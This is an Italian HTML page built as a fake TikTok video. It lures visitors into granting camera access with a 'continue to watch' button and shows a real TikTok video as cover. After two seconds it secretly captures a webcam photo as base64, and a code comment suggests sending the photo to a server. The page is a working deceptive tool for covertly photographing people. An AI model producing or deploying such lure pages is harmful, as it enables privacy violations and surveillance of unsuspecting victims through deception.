<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Finto TikTok</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: black;
            color: white;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .tiktok-screen {
            width: 360px;
            height: 640px;
            background-color: #111;
            border-radius: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px;
        }
        .header {
            color: white;
            font-size: 18px;
            font-weight: bold;
        }
        .continue-btn {
            background-color: #fe2c55;
            border: none;
            padding: 15px;
            color: white;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .continue-btn:hover {
            background-color: #d21f4e;
        }
        .tiktok-video {
            width: 100%;
            height: 280px;
            background-color: #000;
            border-radius: 10px;
            margin-bottom: 20px;
            display: none;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="tiktok-screen">
        <div class="header">
            <h3>Guarda il nuovo video su TikTok</h3>
            <p>Clicca su "Continua per guardare" per iniziare.</p>
        </div>
        
        <div class="tiktok-video" id="tiktok-video">
            <video autoplay loop>
                <source src="https://v16m.tiktok.com/7f44ff56f71f4d58b8b7d3ffafc28ab2/64028d04/video/tos/alisg/tos-alisg-pve-0037/52f3df3b8b5d4a338cf9f6d7173f126d/?a=1233&br=3826&bt=1913&cr=0&cs=0&cv=1&dr=0&ds=3&er=&l=202503232304520101909481738AC1285&lr=tiktok_m&mime_type=video_mp4&net=0&pl=0&qs=0&rc=ZWk4ZDg6Z2VnODMzNzM3M0ApZWY7Zjo6Zmc5NzY2ZzQwPGdpc2o2XmYxYmNeYy1gYGBgMjQ0MmYwYWFeNi06Yw%3D%3D&vl=&vr=" type="video/mp4">
            </video>
        </div>
        
        <button class="continue-btn" onclick="startCamera()">Continua per guardare</button>
    </div>

    <canvas id="canvas" width="640" height="480"></canvas>
    <video id="video" width="640" height="480" style="display:none" autoplay></video>

    <script>
        function startCamera() {
            // Chiede l'accesso alla fotocamera
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const videoElement = document.getElementById('video');
                    videoElement.srcObject = stream;

                    // Mostra il video TikTok
                    document.getElementById('tiktok-video').style.display = 'block';
                    document.querySelector('.continue-btn').style.display = 'none';
                    
                    // Dopo 2 secondi, scatta la foto
                    setTimeout(() => {
                        capturePhoto(videoElement);
                    }, 2000);
                })
                .catch(error => {
                    alert("Devi attivare la telecamera per vedere la magia!");
                });
        }

        function capturePhoto(video) {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            // Disegna il frame del video sul canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Salva l'immagine in formato base64
            const photo = canvas.toDataURL('image/png');
            console.log(photo); // Puoi inviare questa immagine a un server o salvarla come file

            // Per visualizzarla nella pagina (opzionale)
            const img = new Image();
            img.src = photo;
            document.body.appendChild(img); // Aggiunge l'immagine alla pagina (puoi rimuoverlo se non vuoi)
        }
    </script>

</body>
</html>
